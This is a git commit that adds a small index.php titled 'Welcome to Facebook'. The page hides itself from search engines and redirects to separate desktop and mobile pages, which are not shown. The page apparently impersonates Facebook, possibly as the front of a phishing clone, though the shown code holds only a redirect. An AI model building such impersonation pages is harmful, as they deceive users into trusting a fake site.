7bcb8cc625f0d40a2b3625438b24f2f9d5a5bf03
shehrozsheikh <shehrozsheikh@outlook.com>
2016-03-18 00:29:05 +0500

    Added files via upload

---
+++ index.php
@@ -0,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<title>Welcome to Facebook</title>
+
+	<meta name="robots" content="noindex">
+	<meta name="googlebot" content="noindex">
+
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.0/jquery.min.js" class="showscr"></script>
+
+	<script>
+		$(document).ready(function(){
+			var width = $(window).width();
+			if(width > 768){
+				window.location = "desktop/index.html";
+			}
+			else{
+				window.location = "mobile/index.html";
+			}
+		})
+	</script>
+</head>
+<body>
+	
+</body>
+</html>
